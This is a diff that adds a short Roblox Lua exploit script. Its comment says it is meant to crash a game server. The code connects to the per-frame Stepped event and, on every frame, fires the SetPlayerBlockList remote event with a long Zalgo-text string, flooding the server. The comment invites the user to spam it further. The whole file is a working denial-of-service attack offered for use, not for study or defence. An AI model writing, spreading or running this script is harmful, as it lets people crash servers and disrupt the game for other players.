@@ -1,0 +1,5 @@
+-- to attempt to crash just basically spam execute it or add more zalgo text there enjoy
+
+game["Run Service"].Stepped:Connect(function()
+   game.RobloxReplicatedStorage.SetPlayerBlockList:FireServer("p̵̤͕̞͇̃́́̔͝l̸̢͓͉̓̌͋̾͑͑̚s̴̢̡̜̰͖̤̜̙̖͍͔̜̲̥̤͒̃̉̏̄͌̔̃͠ ̸͍͖͈̪̩̮̓̌̾͋̓̅͆̚̚͝ͅç̴̛̣̮̘̺̮̪͖͚͙̟͉̬̐̿̈́̀͊̔̃̽̈́̎̑̚͜͝ͅṙ̵̩͖͚̩̹̎͋̚ã̵̢̡̰̞̘͊̀̓s̸̨̧͉͙̮͉̤͐̍͊̽̀̄̔h̷̢̼͕̤̤̖̙̤͕͇̱̭̝̺̅́̆͑̌͑̈́̊̔̕͘̕")
+end)
